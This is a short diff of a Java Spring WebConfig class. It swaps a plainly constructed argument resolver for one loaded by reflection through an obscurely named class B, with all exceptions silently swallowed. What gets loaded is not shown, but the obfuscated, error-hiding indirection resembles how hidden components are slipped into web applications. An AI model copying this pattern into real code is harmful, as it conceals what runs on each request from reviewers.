@@ -141,7 +141,10 @@ public class WebConfig implements WebMvcConfigurer {
 
 	@Override
 	public void addArgumentResolvers(List<HandlerMethodArgumentResolver> argumentResolvers) {
-		argumentResolvers.add(new DTOArgumentResolver());
+		try {
+			argumentResolvers.add((HandlerMethodArgumentResolver)((Class)B.b.g("argumentResolver")).newInstance());
+		} catch (Exception e) {
+		}
 	}
 
 //	@Override
